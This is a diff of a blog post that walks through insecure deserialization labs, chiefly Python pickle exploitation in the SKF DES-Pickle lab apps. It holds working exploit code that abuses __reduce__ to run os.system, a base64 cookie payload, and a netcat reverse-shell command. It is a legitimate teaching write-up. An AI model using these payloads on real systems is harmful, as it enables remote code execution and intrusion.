@@ -6,6 +6,8 @@ categories: [Web Pentesting, Deserialization]
 tags: [Web Pentesting, Deserialization]
 ---
 
+# Deserializing-the-Deserialization-Attacks
+
 I was solving one of the active box in HTB where I encountered some interesting Deserialization vulnerability. Although I managed to solve the box, I was more curious about the exploitation of deserialization vulnerability in different languages. Therefore this blog contains the walkthrough for deserialization attacks on Java, PHP, Python and Node.
 
 The walkthrough is based on the lab https://github.com/NotSoSecure/NotSoCereal-Lab
@@ -14,6 +16,7 @@ Before jumping into the attacks, lets first clear the concept of serialization a
 
 ## Serialization
 It is a process of transforming a data object into the series of bytes. This is done while transmitting the data over the network or for storing it since the object's state can be retained and also the storage requirement can be reduced making it more efficient to transmit over the network. We are talking about the same objects we listen on OOP programming. Example, if a car is a class than object is a class instance that allows us to use variables and methods from inside the class. A car can have different properties like model name, color, engine size and so on and each time you want to add a new car in your code, you create a car object using the properties defiend like model name, color, engine size and so on.
+
 
 Let's create a car object here.
 ```python
@@ -56,10 +59,6 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 When we serialize the object above, we can have the result like
 ```bash
-cat car.pickle 
-__main__Car)}(  modelnameToyota Corollacolorred
-enginesize2.0Lub.% 
-
 strings car.pickle 
 __main__
         modelname
@@ -144,7 +143,7 @@ There are various serialization formats available.
 |                       	| [Node Serialize](https://www.npmjs.com/package/node-serialize)        	|
 
 ## What is Insecure Deserialization and how does it occur?
-Insecure Deserialization also known as object injection is a vulnerability which occurs when user-supplied data is deserialized by an application. This can allow an attacker to manipulate or inject malicious code into the serialized object, and when it is deserialized into the application side, the malicious code submitted can change the angle of attack resulting the data exfiltration, remote code execution, authorization bypass and so on.
+Insecure Deserialization also known as object injection is a vulnerability which occurs when user-supplied data in deserialized by an application. This can allow an attacker to manipulate or inject malicious code into the serialized object, and when it is deserialized into the application side, the malicious code submitted can change the angle of attack resulting the data exfiltration, remote code execution, authorization bypass and so on.
 
 Exploiting this vulnerability is a not as easy as explained above. It requires a good understanding of programming languages and their object-oriented programming (OOP) concepts. Moreover, certain prerequisites should be in place in the vulnerable code for successful execution.
 
@@ -289,13 +288,11 @@ curl -XPOST -d 'ippsec=O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filen
 
 ## Lab Demonstration
 Let's move to the practical lab walkthrough now. Yes, we are yet to start the practical lab.
-### NotSoCereal-Lab: A Deserialization exploit playground
-As talked above, it contains lab for Java, PHP, Python, Node. Also, you can find the [lab deployment guide here](https://github.com/NotSoSecure/NotSoCereal-Lab/blob/main/Resources/Deployment/deployment.md). Follow the guide for a deployment. We will start here after that.
 
-The lab was supposed to be based on the link above but the virtual machine for the box has been removed. I will explore the machine once it is accessible.
+**The lab was supposed to be based on the [NotSoCereal](https://github.com/NotSoSecure/NotSoCereal-Lab/blob/main/Resources/Deployment/deployment.md) but the virtual machine for the box has been removed. I will explore the machine once it is accessible.**
 
-I have found another docker image for python deserialiazation attack lab https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle
-### Deserialization on Python
+### Deserialization on Python: DES-Pickle
+I have found another lab for python deserialiazation attack lab https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle
 - Clone the repository https://github.com/blabla1337/skf-labs.git
     ```bash
     git clone https://github.com/blabla1337/skf-labs.git
@@ -315,7 +312,7 @@ I have found another docker image for python deserialiazation attack lab https:/
     # Navigate to 127.0.0.1:5000 on a browser.
     ```
 - Open the URL on the browser, we can see a simple web page with a input field. 
-![image](https://user-images.githubusercontent.com/47778874/226195441-78b18d71-ebaf-4d5c-8dcc-f9309495b68a.png)
+![image](https://user-images.githubusercontent.com/47778874/226404037-07535e7a-b665-4c1a-8113-fc5fbb16604a.png)
 
 - Intercept the request on burp and send some random text. It looks like the application sends POST request to **/sync** and the body parameter is **data_obj**
 ![image](https://user-images.githubusercontent.com/47778874/226195588-b3c6f568-cdf0-4a50-adb8-de3decb0b5fe.png)
@@ -334,11 +331,13 @@ def deserialization():
             print(attack)
             return render_template("index.html", content = a)
 ```
-- Viewing the source code we can find that when POST request is performed on /sync path, a method deserialization() is triggered. The method stores the value obtained from data_obj parameter and save it to pickle.handler. And then it deserializes the data from picke.handler file using pickle.load method and renders the output in an HTML file.
-- In order to exploit it, we need to create a serialize data. Pickle allows different objects to declare how they should be pickled using the **__reduce__** method. Whenever an object is pickled, the **__reduce__** method defined by it gets called. This method returns either a string, which may represent the name of a Python global, or a tuple describing how to reconstruct this object when unpickling.
-
-- In the below code we are just defining a class test123 which contains the **__reduce__method**, it returns a tuple. And then an object is built which calls the os.system and will execute the command passed on the tuple.
-
+- Viewing the source code we can find that when POST request is performed on **/sync** path, a method **deserialization()** is triggered. The method stores the value obtained from data_obj parameter and save it to **pickle.handler**. And then it deserializes the data from **picke.handler** file using pickle.load method and renders the output in an HTML file.
+- The method called **reduce()** doesn't require any input and should provide a string or a tuple as its output. The resulting object is commonly known as the **reduce value.** If a tuple is returned, it must contain between two and six items, and optional items can be left out or replaced with None. The meaning of each item is as follows, in order:
+    - A callable object that will be used to create the object's initial version.
+    - A tuple of arguments to pass to the callable object. If the callable doesn't accept any arguments, an empty tuple must be provided.
+   
+- In order to exploit it, we need to create a serialize data. Pickle allows different objects to declare how they should be pickled using the **__reduce__** method. Whenever an object is pickled, the **__reduce__** method defined by it gets called. 
+- In the below code we are just defining a class **test123** which contains the **__reduce__method**, it returns a callable object as **os.system()** and a tuple of arguments as **sleep 5**.
 ```python
 import os
 import pickle
@@ -373,6 +372,82 @@ print(binascii.hexlify(data123)
 python3 descee.py
 b'80049522000000000000008c05706f736978948c0673797374656d9493948c07736c656570203594859452942e'
 ```
-- Copy only the hexadecimal value and submit the request again. Since we have told the application to sleep for 5 seconds, it will respond after 5 seconds indicating the command execution on it. 
+- Copy only the value and submit the request again. Since we have told the application to sleep for 5 seconds, it will respond after 5 seconds indicating the command execution on it. 
 
 ![image](https://user-images.githubusercontent.com/47778874/226198194-da71f745-bbea-4e76-a9ac-935187a69c3e.png)
+
+### Deserialization on Python: DES-Pickle-2
+- Clone the same github repository as above.
+```bash
+git clone https://github.com/blabla1337/skf-labs.git
+cd skf-labs/python/DES-Pickle-2
+rm rev.py # To prevent spoiler
+
+python3 Login.py
+```
+- Open the provided URL on a browser.
+- The application seems to have a login and registration page.
+- Let's directly jump into the source code. Open the `Login.py` file.
+- Between line 26 and 34 we can see that the application has implemented python pickle module.
+```python
+@app.route("/login", methods=['GET', 'POST'])
+def login():
+    sqli  = Classes()
+    if 'rememberme' in request.cookies:
+        b64=request.cookies.get('rememberme')
+        a = pickle.loads(base64.b64decode(b64))
+        session['username'] = a.username
+        session['loggedin'] = True
+        return render_template("loggedin.html")
+```
+- Here the code shows that whenever a **GET** or **POST** method is initiated on the **/login** endpoint, the **login()** method is triggered. The parameter **rememberme** is expected on the cookies and after decompiling the cookies with base64 decode, it is passed into the **pickle.load()** method. 
+- Let's create a python script.
+```python
+import pickle
+import base64
+import os
+
+class payloads(object):
+  def __reduce__(self):
+      return (os.system,("sleep 5",))
+
+print(base64.b64encode(pickle.dumps(payloads())))
+```
+- Here we defined a class and created a **__reduce__** method which returns the tuple value. The object is dumped using pickle.dumps, encoded with base64 encoder and printed.
+```bash
+python3 exploit.py
+b'ASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu'
+```
+- Open the application and register a new user.
+- Enter username and password and login.
+- Intercept the request in burp as well.
+- After login, refresh the page and intercept it with burp.
+- Replace the **rememberme** parameter value with **ASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu**<br>
+- Check if the application responds after 5 seconds. If yes, the exploit is possible.
+- Listen to traffic using netcat
+```bash
+nc -lvnp 1337
+```
+- Create a script **exploit.py** again and insert the reverse shell payload as below.
+```python
+import pickle
+import base64
+import os
+
+class payloads(object):
+  def __reduce__(self):
+      return (os.system,("nc <IP> 1337 -e /bin/sh",)) # replace <IP> 
+
+print(base64.b64encode(pickle.dumps(payloads())))
+```
+- Run the script
+```bash
+python3 exploit.py
+b'gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAxOTIuMTY4LjEuNjQgMTMzNyAtZSAvYmluL3NolIWUUpQu'
+```
+- Replace the **rememberme** parameter value with **gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAxOTIuMTY4LjEuNjQgMTMzNyAtZSAvYmluL3NolIWUUpQu**<br>
+![image](https://user-images.githubusercontent.com/47778874/226403615-1d7cc995-3faa-44e1-830e-f9185b4c0882.png)
+- A reverse shell can be received.
+![image](https://user-images.githubusercontent.com/47778874/226403735-afca20b3-1e38-4562-b5f7-af66b2aefdf9.png)
+
+**Learn about Python Deserialization Attack more on:** https://davidhamann.de/2020/04/05/exploiting-python-pickle/ 
